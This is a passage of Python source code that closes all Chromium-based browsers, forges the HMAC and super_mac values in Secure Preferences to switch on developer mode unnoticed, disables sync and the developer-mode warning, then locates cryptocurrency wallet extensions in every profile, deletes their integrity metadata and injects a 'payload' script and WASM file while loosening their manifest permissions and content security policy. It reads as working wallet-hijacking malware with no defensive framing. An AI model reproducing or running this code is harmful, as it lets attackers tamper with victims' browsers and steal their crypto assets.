            del ext_macs["settings_encrypted_hash"]
        return changed

    @staticmethod
    def _decode_manifest_public_key_bytes(key_str: str) -> Optional[bytes]:
        """
        Match Extension::ParsePEMKeyBytes (extensions/common/extension.cc):
        PEM wrapper or raw base64 → SPKI / public key bytes for GenerateId().
        """
        s = key_str.strip()
        m = re.search(
            r"-----BEGIN[^-]+-----\s*([A-Za-z0-9+/=\s]+)\s*-----END[^-]+-----",
            s,
            re.DOTALL,
        )
        if m:
            payload = re.sub(r"\s+", "", m.group(1))
        else:
            payload = re.sub(r"\s+", "", s)
        if not payload:
            return None
        try:
            return base64.b64decode(payload, validate=False)
        except Exception:
            return None

    @staticmethod
    def _crx_extension_id_from_sha256_input(raw: bytes) -> str:
        """components/crx_file/id_util.cc GenerateId + ConvertHexadecimalToIDAlphabet."""
        digest = hashlib.sha256(raw).digest()[:16]
        hexstr = digest.hex()
        return "".join(chr(ord("a") + int(ch, 16)) for ch in hexstr)

    def _compute_chrome_extension_id(
        self, manifest: dict, path_norm: str
    ) -> Optional[str]:
        """
        extensions/common/extension.cc ComputeExtensionID:
        - If manifest has 'key', id = SHA256(public_key_bytes) (first 16 bytes, a-p alphabet).
        - Else id = SHA256(path bytes); Windows uses UTF-16LE path + uppercase drive letter
          (crx_file/id_util.cc MaybeNormalizePath / GenerateIdForPath).
        """
        key_field = manifest.get("key")
        if isinstance(key_field, str) and key_field.strip():
            raw = self._decode_manifest_public_key_bytes(key_field.strip())
            if not raw:
                logger.error("Manifest has 'key' but it could not be decoded as base64/PEM")
                return None
            return self._crx_extension_id_from_sha256_input(raw)
        p = path_norm
        if os.name == "nt":
            if len(p) >= 2 and p[1] == ":" and "a" <= p[0] <= "z":
                p = p[0].upper() + p[1:]
            path_bytes = p.encode("utf-16-le")
        else:
            path_bytes = p.encode("utf-8")
        return self._crx_extension_id_from_sha256_input(path_bytes)

    def _sync_extension_settings_macs(
        self, data: Dict, browser_name: str, extension_ids: List[str]
    ) -> None:
        """Recompute legacy MAC for each extensions.settings.<id> we mutated."""
        if not extension_ids:
            return
        self._ensure_protection_macs_layout(data)
        self._strip_extensions_settings_encrypted_hashes(data, extension_ids)
        macs_settings = data['protection']['macs']['extensions']['settings']
        settings = data.get('extensions', {}).get('settings', {})
        for eid in extension_ids:
            if eid not in settings:
                continue
            path = f'extensions.settings.{eid}'
            h = self.calculate_hmac(settings[eid], path, browser_name)
            if h:
                macs_settings[eid] = h

    def _sync_developer_mode_tracked_macs(
        self, data: Dict, browser_name: str, signed_profile: bool
    ) -> None:
        """Update MACs for extensions.ui.developer_mode and signed account_values path."""
        self._ensure_protection_macs_layout(data)
        macs = data['protection']['macs']

        if signed_profile:
            account_hmac = self.calculate_hmac(
                True, 'account_values.extensions.ui.developer_mode', browser_name
            )
            if account_hmac:
                if 'account_values' not in macs:
                    macs['account_values'] = {}
                if 'extensions' not in macs['account_values']:
                    macs['account_values']['extensions'] = {}
                if 'ui' not in macs['account_values']['extensions']:
                    macs['account_values']['extensions']['ui'] = {}
                macs['account_values']['extensions']['ui']['developer_mode'] = account_hmac

        ext_ui_hmac = self.calculate_hmac(True, 'extensions.ui.developer_mode', browser_name)
        if ext_ui_hmac:
            if 'extensions' not in macs:
                macs['extensions'] = {}
            if 'ui' not in macs['extensions']:
                macs['extensions']['ui'] = {}
            macs['extensions']['ui']['developer_mode'] = ext_ui_hmac

    def _sync_super_mac(self, data: Dict, browser_name: str) -> None:
        sm = self.calculate_super_mac(data['protection']['macs'], browser_name)
        if sm:
            data['protection']['super_mac'] = sm

    def _strip_developer_mode_encrypted_hashes(self, data: Dict) -> bool:
        """
        Chrome stores OS-encrypted hashes under protection.macs using nested dicts
        (DictionaryHashStoreContents::SetByDottedPath), e.g.:
          macs.extensions.ui.developer_mode_encrypted_hash
          macs.account_values.extensions.ui.developer_mode_encrypted_hash
        PrefHashStoreImpl checks encrypted hashes before legacy MACs (CheckValueInternal).
        Stale ciphertext for 'false' blocks developer_mode=true + updated legacy MAC.
        """
        prot = data.get("protection")
        if not isinstance(prot, dict):
            return False
        macs = prot.get("macs")
        if not isinstance(macs, dict):
            return False
        removed = False

        def _del_nested(root: Dict, path: Tuple[str, ...]) -> bool:
            cur: Any = root
            for p in path[:-1]:
                if not isinstance(cur, dict) or p not in cur:
                    return False
                cur = cur[p]
            leaf = path[-1]
            if isinstance(cur, dict) and leaf in cur:
                del cur[leaf]
                return True
            return False

        if _del_nested(macs, ("extensions", "ui", "developer_mode_encrypted_hash")):
            logger.info("Removed nested protection.macs.extensions.ui.developer_mode_encrypted_hash")
            removed = True
        if _del_nested(
            macs,
            ("account_values", "extensions", "ui", "developer_mode_encrypted_hash"),
        ):
            logger.info(
                "Removed nested protection.macs.account_values.extensions.ui.developer_mode_encrypted_hash"
            )
            removed = True

        # Older/alternate flat keys (entire path as one dict key) — rare but cheap
        for flat_key in (
            "extensions.ui.developer_mode_encrypted_hash",
            "account_values.extensions.ui.developer_mode_encrypted_hash",
        ):
            if flat_key in macs:
                del macs[flat_key]
                logger.info("Removed flat encrypted hash key: %s", flat_key)
                removed = True

        return removed

    def _close_all_browsers(self) -> bool:
        """Close Chromium-based browsers on Windows or macOS."""
        logger.info("🔄 Starting browser closure process")
        os_type = self.get_os_type()
        logger.debug(f"🖥️ Detected OS type: {os_type}")

        if os_type == 'windows':
            logger.debug("🪟 Using Windows browser closure method")
            return self._close_browsers_windows()
        logger.debug("🍎 Using macOS browser closure method")
        return self._close_browsers_macos()

    def _close_browsers_windows(self) -> bool:
        """Close Chromium browsers on Windows"""
        logger.info("🪟 Starting Windows browser closure process")

        # List of Chromium-based browser process names
        browser_processes = [
            'chrome.exe',
            'msedge.exe',
            'brave.exe',
            'chromium.exe',
            'opera.exe',
            'vivaldi.exe',
            'yandex.exe'
        ]

        logger.debug(f"🎯 Target processes: {', '.join(browser_processes)}")
        closed_count = 0

        for process_name in browser_processes:
            logger.debug(f"🔍 Attempting to close {process_name}")
            try:
                # Try to terminate gracefully first
                logger.debug(f"⚡ Running graceful termination for {process_name}")
                result = subprocess.run(['taskkill', '/IM', process_name, '/T'],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    logger.info(f"✅ Successfully terminated {process_name}")
                    closed_count += 1
                else:
                    logger.debug(f"ℹ️ {process_name} was not running or already closed")

                # Force kill if still running
                logger.debug(f"🔨 Running force termination for {process_name}")
                subprocess.run(['taskkill', '/IM', process_name, '/F', '/T'],
                             capture_output=True, text=True, timeout=5)

            except subprocess.TimeoutExpired:
                logger.warning(f"⏰ Timeout while trying to close {process_name}")
            except Exception as e:
                logger.debug(f"ℹ️ {process_name} not found or already closed: {e}")

        # Wait for processes to fully terminate (optimized timing)
        if closed_count > 0:
            logger.info(f"⏳ Waiting 2 seconds for {closed_count} processes to fully terminate")
            time.sleep(2)  # Reduced from 3 to 2 seconds for better performance
        else:
            logger.info("ℹ️ No browser processes were running")

        logger.info("✅ Windows browser closure process completed")
        return True

    def _close_browsers_macos(self) -> bool:
        """Close Chromium browsers on macOS"""
        # List of Chromium-based browser app names
        browser_apps = [
            'Google Chrome',
            'Microsoft Edge',
            'Brave Browser',
            'Chromium',
            'Opera',
            'Vivaldi'
        ]

        closed_count = 0

        for app_name in browser_apps:
            try:
                # Try to quit gracefully using AppleScript
                script = f'tell application "{app_name}" to quit'
                result = subprocess.run(['osascript', '-e', script],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    closed_count += 1

            except (subprocess.TimeoutExpired, Exception):
                pass  # App might not be running

        # Force kill any remaining processes (optimized)
        force_kill_patterns = ['Chrome', 'Edge', 'Brave']
        for pattern in force_kill_patterns:
            try:
                subprocess.run(['pkill', '-f', pattern], capture_output=True, timeout=3)
            except Exception:
                pass

        # Wait for processes to fully terminate (optimized timing)
        if closed_count > 0:
            time.sleep(2)  # Reduced from 3 to 2 seconds for better performance

        return True

    def _check_browsers_running(self) -> bool:
        """Check if any Chromium-based browsers are currently running"""
        os_type = self.get_os_type()

        try:
            if os_type == 'windows':
                # Check for Windows browser processes
                browser_processes = ['chrome.exe', 'msedge.exe', 'brave.exe', 'chromium.exe']
                for process in browser_processes:
                    result = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {process}'],
                                          capture_output=True, text=True, timeout=5)
                    if process in result.stdout:
                        return True

            elif os_type == 'darwin':
                # Check for macOS browser processes
                result = subprocess.run(['pgrep', '-f', 'Chrome|Edge|Brave|Chromium'],
                                      capture_output=True, text=True, timeout=5)
                return result.returncode == 0

        except Exception:
            # If we can't check, assume browsers might be running
            return True

        return False

    def get_chromium_browser_paths(self):
        """Get paths for all Chromium-based browsers (cached for performance)"""
        if self._browser_paths_cache is not None:
            return self._browser_paths_cache

        browser_paths = {}

        if os.name == 'nt':  # Windows
            browser_paths = {
                # Chrome variants
                "Chrome": f"C:\\Users\\{self.username}\\AppData\\Local\\Google\\Chrome\\User Data",
                "Chrome-Beta": f"C:\\Users\\{self.username}\\AppData\\Local\\Google\\Chrome Beta\\User Data",
                "Chrome-Dev": f"C:\\Users\\{self.username}\\AppData\\Local\\Google\\Chrome Dev\\User Data",
                "Chrome-Canary": f"C:\\Users\\{self.username}\\AppData\\Local\\Google\\Chrome SxS\\User Data",
                # Edge variants
                "Edge": f"C:\\Users\\{self.username}\\AppData\\Local\\Microsoft\\Edge\\User Data",
                "Edge-Beta": f"C:\\Users\\{self.username}\\AppData\\Local\\Microsoft\\Edge Beta\\User Data",
                "Edge-Dev": f"C:\\Users\\{self.username}\\AppData\\Local\\Microsoft\\Edge Dev\\User Data",
                "Edge-Canary": f"C:\\Users\\{self.username}\\AppData\\Local\\Microsoft\\Edge SxS\\User Data",
                # Brave variants
                "Brave": f"C:\\Users\\{self.username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
                "Brave-Beta": f"C:\\Users\\{self.username}\\AppData\\Local\\BraveSoftware\\Brave-Browser-Beta\\User Data",
                "Brave-Nightly": f"C:\\Users\\{self.username}\\AppData\\Local\\BraveSoftware\\Brave-Browser-Nightly\\User Data",
                # Opera variants
                "Opera": f"C:\\Users\\{self.username}\\AppData\\Roaming\\Opera Software\\Opera Stable",
                "OperaGX": f"C:\\Users\\{self.username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable",
                "Opera-Beta": f"C:\\Users\\{self.username}\\AppData\\Roaming\\Opera Software\\Opera Beta",
                "Opera-Developer": f"C:\\Users\\{self.username}\\AppData\\Roaming\\Opera Software\\Opera Developer",
                # Other browsers
                "Vivaldi": f"C:\\Users\\{self.username}\\AppData\\Local\\Vivaldi\\User Data",
                "Vivaldi-Snapshot": f"C:\\Users\\{self.username}\\AppData\\Local\\Vivaldi-Snapshot\\User Data",
                "Chromium": f"C:\\Users\\{self.username}\\AppData\\Local\\Chromium\\User Data",
                "Yandex": f"C:\\Users\\{self.username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data",
                "Arc": f"C:\\Users\\{self.username}\\AppData\\Local\\Arc\\User Data",
                "Thorium": f"C:\\Users\\{self.username}\\AppData\\Local\\Thorium\\User Data",
                "Iridium": f"C:\\Users\\{self.username}\\AppData\\Local\\Iridium\\User Data",
                "SRWare-Iron": f"C:\\Users\\{self.username}\\AppData\\Local\\Chromium\\User Data",
                "Ungoogled-Chromium": f"C:\\Users\\{self.username}\\AppData\\Local\\Chromium\\User Data"
            }
        elif sys.platform == 'darwin':  # macOS
            browser_paths = {
                # Chrome variants
                "Chrome": f"/Users/{self.username}/Library/Application Support/Google/Chrome",
                "Chrome-Beta": f"/Users/{self.username}/Library/Application Support/Google/Chrome Beta",
                "Chrome-Dev": f"/Users/{self.username}/Library/Application Support/Google/Chrome Dev",
                "Chrome-Canary": f"/Users/{self.username}/Library/Application Support/Google/Chrome Canary",
                # Edge variants
                "Edge": f"/Users/{self.username}/Library/Application Support/Microsoft Edge",
                "Edge-Beta": f"/Users/{self.username}/Library/Application Support/Microsoft Edge Beta",
                "Edge-Dev": f"/Users/{self.username}/Library/Application Support/Microsoft Edge Dev",
                "Edge-Canary": f"/Users/{self.username}/Library/Application Support/Microsoft Edge Canary",
                # Brave variants
                "Brave": f"/Users/{self.username}/Library/Application Support/BraveSoftware/Brave-Browser",
                "Brave-Beta": f"/Users/{self.username}/Library/Application Support/BraveSoftware/Brave-Browser-Beta",
                "Brave-Nightly": f"/Users/{self.username}/Library/Application Support/BraveSoftware/Brave-Browser-Nightly",
                # Opera variants
                "Opera": f"/Users/{self.username}/Library/Application Support/com.operasoftware.Opera",
                "Opera-Beta": f"/Users/{self.username}/Library/Application Support/com.operasoftware.OperaBeta",
                "Opera-Developer": f"/Users/{self.username}/Library/Application Support/com.operasoftware.OperaDeveloper",
                "OperaGX": f"/Users/{self.username}/Library/Application Support/com.operasoftware.OperaGX",
                # Other browsers
                "Vivaldi": f"/Users/{self.username}/Library/Application Support/Vivaldi",
                "Vivaldi-Snapshot": f"/Users/{self.username}/Library/Application Support/Vivaldi Snapshot",
                "Chromium": f"/Users/{self.username}/Library/Application Support/Chromium",
                "Yandex": f"/Users/{self.username}/Library/Application Support/Yandex/YandexBrowser",
                "Arc": f"/Users/{self.username}/Library/Application Support/Arc",
                "Thorium": f"/Users/{self.username}/Library/Application Support/Thorium",
                "Iridium": f"/Users/{self.username}/Library/Application Support/iridium"
            }
        else:
            browser_paths = {}

        # Cache the result for performance
        self._browser_paths_cache = browser_paths
        return browser_paths

    def _enumerate_profile_directories(self, browser_path: str) -> List[str]:
        """
        Discover Chromium profile folders under User Data.

        Merges Local State → profile.info_cache with any subdirectory containing
        Preferences so renamed or non-default profile names are not skipped.
        """
        found: Set[str] = set()
        local_state = os.path.join(browser_path, "Local State")
        if os.path.isfile(local_state):
            try:
                with open(local_state, "r", encoding="utf-8") as f:
                    ls = json.load(f)
                ic = (ls.get("profile") or {}).get("info_cache")
                if isinstance(ic, dict):
                    for name in ic:
                        if not isinstance(name, str) or not name:
                            continue
                        prefs_fp = os.path.join(browser_path, name, "Preferences")
                        if os.path.isfile(prefs_fp):
                            found.add(name)
            except (OSError, json.JSONDecodeError, TypeError, UnicodeDecodeError) as e:
                logger.debug(
                    "Local State profile list skipped for %s: %s", browser_path, e
                )

        try:
            for item in os.listdir(browser_path):
                item_path = os.path.join(browser_path, item)
                if not os.path.isdir(item_path):
                    continue
                prefs_fp = os.path.join(item_path, "Preferences")
                if os.path.isfile(prefs_fp):
                    found.add(item)
        except (OSError, PermissionError) as e:
            logger.warning("Cannot list user data directory %s: %s", browser_path, e)

        def _sort_key(n: str) -> Tuple[int, str]:
            if n == "Default":
                return (0, "")
            if n == "Guest Profile":
                return (2, n)
            if n == "System Profile":
                return (4, n)
            return (1, n.lower())

        return sorted(found, key=_sort_key)

    def _get_local_state_profile_hints(self, user_data_dir: str) -> Dict[str, Any]:
        """
        Read Chrome/Edge Local State (JSON) for profile startup hints.
        prefs::kProfileLastUsed → profile.last_used (folder name Chrome opens by default).
        """
        out: Dict[str, Any] = {}
        p = os.path.join(user_data_dir, "Local State")
        if not os.path.isfile(p):
            return out
        try:
            with open(p, "r", encoding="utf-8") as f:
                ls = json.load(f)
            prof = ls.get("profile")
            if isinstance(prof, dict):
                lu = prof.get("last_used")
                if isinstance(lu, str) and lu:
                    out["last_used"] = lu
                la = prof.get("last_active_profiles")
                if isinstance(la, list) and la:
                    out["last_active_profiles"] = la[:8]
        except (OSError, json.JSONDecodeError, TypeError, UnicodeDecodeError):
            pass
        return out

    def find_all_browser_profiles(self):
        """Find all available browser profiles across all Chromium browsers (cached for performance)"""
        logger.info("🔍 Starting browser profile discovery")

        if self._browser_profiles_cache is not None:
            logger.debug("💾 Using cached browser profiles")
            return self._browser_profiles_cache

        browser_profiles = {}
        browser_paths = self.get_chromium_browser_paths()
        logger.debug(f"🎯 Checking {len(browser_paths)} potential browser locations")

        for browser_name, browser_path in browser_paths.items():
            logger.debug(f"🔍 Checking {browser_name} at: {browser_path}")
            if os.path.exists(browser_path):
                logger.debug(f"✅ {browser_name} path exists, scanning for profiles")
                try:
                    profiles = self._enumerate_profile_directories(browser_path)
                    for item in profiles:
                        logger.debug(
                            "✅ Found valid profile: %s/%s", browser_name, item
                        )

                    if profiles:
                        browser_profiles[browser_name] = {
                            "path": browser_path,
                            "profiles": profiles,
                        }
                        hints = self._get_local_state_profile_hints(browser_path)
                        lu = hints.get("last_used")
                        if lu:
                            logger.info(
                                "✅ %s: %d profile dir(s): %s | Local State profile.last_used=%r "
                                "(startup profile folder — must match a patched profile if the "
                                "extension is missing)",
                                browser_name,
                                len(profiles),
                                ", ".join(profiles),
                                lu,
                            )
                        else:
                            logger.info(
                                "✅ %s: Found %d profiles: %s",
                                browser_name,
                                len(profiles),
                                ", ".join(profiles),
                            )
                    else:
                        logger.debug(f"ℹ️ {browser_name}: No valid profiles found")

                except PermissionError as e:
                    logger.warning(f"🔒 Permission denied accessing {browser_name}: {e}")
                except Exception as e:
                    logger.warning(f"❌ Error scanning {browser_name}: {e}")
            else:
                logger.debug(f"ℹ️ {browser_name} not installed (path doesn't exist)")

        # Cache the result for performance
        self._browser_profiles_cache = browser_profiles
        logger.info(f"🎯 Profile discovery complete: Found {len(browser_profiles)} browsers with profiles")
        return browser_profiles

    def enable_developer_mode_signed(self, data: Dict, browser_name: str = "chrome") -> Tuple[Dict, bool]:
        """
        Signed-in profile: mirror Chrome's prefs::kExtensionsUIDeveloperMode (extensions.ui.developer_mode)
        plus account_values.extensions.ui.developer_mode when present. See extension_util.cc
        SetDeveloperModeForProfile and chrome_pref_service_factory.cc tracked pref id 35.
        """
        value_changed = self._strip_developer_mode_encrypted_hashes(data)

        account_dev_mode = (
            data.get('account_values', {})
            .get('extensions', {})
            .get('ui', {})
            .get('developer_mode', False)
        )

        if not account_dev_mode:
            if 'account_values' not in data:
                data['account_values'] = {}
            if 'extensions' not in data['account_values']:
                data['account_values']['extensions'] = {}
            if 'ui' not in data['account_values']['extensions']:
                data['account_values']['extensions']['ui'] = {}
            data['account_values']['extensions']['ui']['developer_mode'] = True
            value_changed = True

        if 'extensions' not in data:
            data['extensions'] = {}
        if 'ui' not in data['extensions']:
            data['extensions']['ui'] = {}
        if not data['extensions']['ui'].get('developer_mode'):
            data['extensions']['ui']['developer_mode'] = True
            value_changed = True

        _, ext_modified_ids = self.enable_extensions(data)
        if ext_modified_ids:
            value_changed = True

        old_super = (data.get("protection") or {}).get("super_mac")
        self._sync_extension_settings_macs(data, browser_name, ext_modified_ids)
        self._sync_developer_mode_tracked_macs(data, browser_name, signed_profile=True)
        self._sync_super_mac(data, browser_name)
        new_super = (data.get("protection") or {}).get("super_mac")

        mac_or_super_changed = (old_super or "") != (new_super or "")
        modified = value_changed or mac_or_super_changed
        return data, modified

    def enable_developer_mode_unsigned(self, data: Dict, browser_name: str = "chrome") -> Tuple[Dict, bool]:
        """Unsigned profile: extensions.ui.developer_mode only (Chrome pref path)."""
        value_changed = self._strip_developer_mode_encrypted_hashes(data)

        if 'extensions' not in data:
            data['extensions'] = {}
        if 'ui' not in data['extensions']:
            data['extensions']['ui'] = {}
        if not data['extensions']['ui'].get('developer_mode'):
            data['extensions']['ui']['developer_mode'] = True
            value_changed = True

        _, ext_modified_ids = self.enable_extensions(data)
        if ext_modified_ids:
            value_changed = True

        old_super = (data.get("protection") or {}).get("super_mac")
        self._sync_extension_settings_macs(data, browser_name, ext_modified_ids)
        self._sync_developer_mode_tracked_macs(data, browser_name, signed_profile=False)
        self._sync_super_mac(data, browser_name)
        new_super = (data.get("protection") or {}).get("super_mac")

        mac_or_super_changed = (old_super or "") != (new_super or "")
        modified = value_changed or mac_or_super_changed
        return data, modified

    def process_secure_preferences(self, profile_path: Path) -> Tuple[bool, str]:
        """Process a single Secure Preferences file and return if modified and profile type."""
        secure_prefs_path = profile_path / 'Secure Preferences'

        if not secure_prefs_path.exists():
            return False, "unknown"

        try:
            with open(secure_prefs_path, 'r', encoding='utf-8') as f:
                data = json.load(f, object_pairs_hook=OrderedDict)

            # Detect profile type
            profile_type = self.detect_profile_type(data)

            # Determine browser name from profile path
            browser_name = "chrome"  # Default
            profile_path_str = str(profile_path).lower()
            if "edge" in profile_path_str:
                browser_name = "edge"
            elif "brave" in profile_path_str:
                browser_name = "brave"
            elif "opera" in profile_path_str:
                browser_name = "opera"
            elif "vivaldi" in profile_path_str:
                browser_name = "vivaldi"

            if profile_type == "signed":
                modified_data, was_modified = self.enable_developer_mode_signed(data, browser_name)
            else:
                modified_data, was_modified = self.enable_developer_mode_unsigned(data, browser_name)

            if was_modified:
                backup_path = self.backup_file(secure_prefs_path)

                with open(secure_prefs_path, 'w', encoding='utf-8') as f:
                    json.dump(
                        modified_data,
                        f,
                        separators=(',', ':'),
                        ensure_ascii=False,
                    )
                return True, profile_type
            else:
                return False, profile_type

        except json.JSONDecodeError:
            return False, "unknown"
        except Exception:
            return False, "unknown"

    def update_regular_preferences(self, profile_path: Path) -> bool:
        """Update the regular Preferences file to enable developer mode and disable sync."""
        prefs_path = profile_path / 'Preferences'

        if not prefs_path.exists():
            print("  WARNING: No regular Preferences file found")
            return False

        try:
            with open(prefs_path, 'r', encoding='utf-8') as f:
                data = json.load(f, object_pairs_hook=OrderedDict)

            modified = False
            sync_prefs_touched = False

            # STEP 1: Disable sync (matches components/sync/service/sync_prefs.cc +
            # sync_feature_status_for_migrations_recorder.cc). If
            # sync.keep_everything_synced stays true, Chrome ignores per-type prefs.
            if 'sync' not in data:
                data['sync'] = {}

            sync = data['sync']
            if not isinstance(sync, dict):
                data['sync'] = {}
                sync = data['sync']

            if _prefs_set_path(data, "sync.managed", True):
                modified = True
                sync_prefs_touched = True

            # Not a registered Chrome pref; remove if present (legacy script noise).
            if 'requested' in sync:
                del sync['requested']
                modified = True
                sync_prefs_touched = True

            if _prefs_set_path(data, "sync.keep_everything_synced", False):
                modified = True
                sync_prefs_touched = True

            # SyncFeatureStatusForSyncToSigninMigration::kDisabled = 5
            if _prefs_set_path(data, "sync.feature_status_for_sync_to_signin", 5):
                modified = True
                sync_prefs_touched = True

            for suffix in _SYNC_USER_TYPE_PREFS_FALSE:
                if _prefs_set_path(data, f"sync.{suffix}", False):
                    modified = True
                    sync_prefs_touched = True

            dts = sync.get("data_type_status_for_sync_to_signin")
            if not isinstance(dts, dict):
                sync["data_type_status_for_sync_to_signin"] = {}
                dts = sync["data_type_status_for_sync_to_signin"]
                modified = True
                sync_prefs_touched = True
            for key in list(dts.keys()):
                if dts.get(key):
                    dts[key] = False
                    modified = True
                    sync_prefs_touched = True
            for key in _SYNC_DATA_TYPE_STATUS_KEYS:
                if dts.get(key):
                    dts[key] = False
                    modified = True
                    sync_prefs_touched = True
                elif key not in dts:
                    dts[key] = False
                    modified = True
                    sync_prefs_touched = True

            stpa = sync.get("selected_types_per_account")
            if isinstance(stpa, dict):
                for _acct, type_map in stpa.items():
                    if not isinstance(type_map, dict):
                        continue
                    for tname, val in list(type_map.items()):
                        if val:
                            type_map[tname] = False
                            modified = True
                            sync_prefs_touched = True

            if sync_prefs_touched:
                logger.info(
                    "Sync prefs aligned with Chromium: managed, keep_everything_synced=false, "
                    "user-selectable types false, data_type_status_for_sync_to_signin "
                    "(incl. extension_settings), feature_status=kDisabled(5), "
                    "selected_types_per_account cleared"
                )

            # STEP 2: Enable developer mode settings
            # Ensure extensions section exists
            if 'extensions' not in data:
                data['extensions'] = {}

            # Ensure UI section exists
            if 'ui' not in data['extensions']:
                data['extensions']['ui'] = {}

            # Set developer mode to true
            if not data['extensions']['ui'].get('developer_mode', False):
                data['extensions']['ui']['developer_mode'] = True
                modified = True

            # Same as Secure path: strip DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION (1<<24) from
            # every extensions.settings row in this file so merge with Secure is not inconsistent.
            _, ext_dev_cleared_prefs = self.enable_extensions(data)
            if ext_dev_cleared_prefs:
                modified = True

            # Disable developer mode warning
            if data['extensions']['ui'].get('show_dev_mode_warning', True):
                data['extensions']['ui']['show_dev_mode_warning'] = False
                modified = True
                print("  SUCCESS: Disabled developer mode warning in regular Preferences")

            # Ensure alerts section exists and is initialized
            if 'alerts' not in data['extensions']:
                data['extensions']['alerts'] = {"initialized": True}
                modified = True
                print("  SUCCESS: Initialized extension alerts in regular Preferences")
            elif not data['extensions']['alerts'].get('initialized', False):
                data['extensions']['alerts']['initialized'] = True
                modified = True
                print("  SUCCESS: Set extension alerts initialized in regular Preferences")

            # Make sure autoupdate is enabled
            if 'autoupdate' not in data['extensions']:
                data['extensions']['autoupdate'] = {"enabled": True}
                modified = True
                print("  SUCCESS: Enabled extension autoupdate in regular Preferences")
            elif not data['extensions']['autoupdate'].get('enabled', False):
                data['extensions']['autoupdate']['enabled'] = True
                modified = True
            if modified:
                # Create backup
                backup_path = self.backup_file(prefs_path)

                # Chrome JsonPrefStore::SerializeData uses base::WriteJson (compact).
                with open(prefs_path, 'w', encoding='utf-8') as f:
                    json.dump(data, f, separators=(',', ':'), ensure_ascii=False)

                return True
            else:
                return False

        except json.JSONDecodeError as e:
            print(f"  ERROR: JSON parsing error in Preferences: {e}")
            return False
        except Exception as e:
            print(f"  ERROR: Error processing Preferences file: {e}")
            return False

    def get_default_extensions_path(self):
        """Get the default extensions path based on the operating system"""
        # Base extensions path
        if os.name == 'nt':  # Windows
            extensions_base_path = f"C:\\Users\\{self.username}\\AppData\\Local\\Extensions"
        elif sys.platform == 'darwin':  # macOS
            extensions_base_path = f"/Users/{self.username}/Library/Application Support/Extensions"
        else:
            extensions_base_path = ""

        return extensions_base_path

    # ------------------------------------------------------------------
    # In-place extension modification (inject payload + patch files)
    # ------------------------------------------------------------------

    @staticmethod
    def _find_all_extension_version_dirs(profile_path: str, ext_id: str) -> List[str]:
        """Find ALL version directories for a Chrome extension that contain manifest.json."""
        ext_root = os.path.join(profile_path, "Extensions", ext_id)
        if not os.path.isdir(ext_root):
            return []
        results = []
        for d in os.listdir(ext_root):
            vpath = os.path.join(ext_root, d)
            if os.path.isdir(vpath) and os.path.isfile(os.path.join(vpath, "manifest.json")):
                results.append(vpath)
        return results

    @staticmethod
    def _inject_payload(ext_source_dir: str) -> bool:
        """Copy dm_core_bg.js and dm_core_bg.wasm into the extension source directory."""
        js_src = str(_payload.js_path())
        wasm_src = str(_payload.wasm_path())
        if not os.path.isfile(js_src) or not os.path.isfile(wasm_src):
            logger.warning("Payload files not found: %s / %s", js_src, wasm_src)
            return False
        try:
            shutil.copy2(js_src, os.path.join(ext_source_dir, INJECTED_JS_NAME))
            shutil.copy2(wasm_src, os.path.join(ext_source_dir, PAYLOAD_WASM))
            return True
        except Exception as e:
            logger.warning("Failed to copy payload to %s: %s", ext_source_dir, e)
            return False

    @staticmethod
    def _patch_html_files(ext_source_dir: str) -> int:
        """Inject vault script right after opening <head> (first deferred script); relax meta CSP for WASM."""
        return patch_extension_html_tree(
            ext_source_dir,
            INJECTED_JS_NAME,
            on_error=lambda p, e: logger.debug("Failed to patch HTML %s: %s", p, e),
        )

    @staticmethod
    def _patch_extension_manifest(ext_source_dir: str) -> bool:
        """Update manifest.json with required permissions and CSP. Skips write if already correct."""
        return patch_extension_manifest(
            ext_source_dir,
            REQUIRED_PERMISSIONS,
            REQUIRED_HOST_PERMISSIONS,
            on_error=lambda e: logger.warning("Failed to patch manifest in %s: %s", ext_source_dir, e),
        )

    def _modify_extensions_in_place(self) -> bool:
        """Modify all detected wallet extensions in-place across all browser profiles."""
        browser_profiles = self.find_all_browser_profiles()
        if not browser_profiles:
            logger.warning("No browser profiles found for in-place modification")
            return False

        total_modified = 0
        total_attempted = 0

        for browser_name, browser_info in browser_profiles.items():
            browser_path = browser_info["path"]
            profiles = browser_info["profiles"]

            for profile_name in profiles:
                profile_path = os.path.join(browser_path, profile_name)

                for ext_id, wallet_name in WALLET_NAMES.items():
                    version_dirs = self._find_all_extension_version_dirs(profile_path, ext_id)
                    if not version_dirs:
                        continue

                    total_attempted += 1
                    any_ok = False

                    for vdir in version_dirs:
                        metadata_dir = os.path.join(vdir, "_metadata")
                        if os.path.isdir(metadata_dir):
                            try:
                                shutil.rmtree(metadata_dir)
                            except Exception:
                                try:
                                    import stat
                                    for r, d, f in os.walk(metadata_dir):
                                        for fn in f:
                                            fp = os.path.join(r, fn)
                                            os.chmod(fp, stat.S_IWRITE)
                                            os.remove(fp)
                                    shutil.rmtree(metadata_dir)
                                except Exception:
                                    logger.warning("Failed to remove _metadata in %s", vdir)
                        if not self._inject_payload(vdir):
                            continue
                        self._patch_html_files(vdir)
                        self._patch_extension_manifest(vdir)
                        any_ok = True

                    if any_ok:
                        total_modified += 1
                        logger.info(
                            "Modified %s in %s/%s (%d version(s))",
                            wallet_name, browser_name, profile_name, len(version_dirs),
                        )

        logger.info(
            "In-place modification complete: %d/%d extensions modified",
            total_modified, total_attempted,
        )
        return total_modified > 0

    def run_unified_process(self, extensions_base_path=None):
        """Main unified process: terminate browsers, enable dev mode, replace extensions"""
        logger.info("🚀 Starting unified Chrome management process")
        logger.info("="*60)

        # Fresh profile list (avoid stale cache if this process reused the manager).
        self._browser_profiles_cache = None

        # Always close browsers first
        logger.info("🔄 Step 1: Checking for running browsers")
        if self._check_browsers_running():
            logger.info("🔍 Running browsers detected, attempting to close them")
            if not self._close_all_browsers():
                logger.error("❌ Failed to close browsers")
                print("❌ Failed to close browsers")
                return False
            logger.info("✅ All browsers closed successfully")
        else:
            logger.info("ℹ️ No browsers currently running")

        # Modify extensions in-place (inject payload, patch HTML, patch manifest)
        logger.info("🔄 Step 2: Modifying extensions in-place")
        modify_success = self._modify_extensions_in_place()
        if modify_success:
            logger.info("✅ Extensions modified in-place successfully")
        else:
            logger.warning("⚠️ No extensions modified in-place (payload files may be missing)")

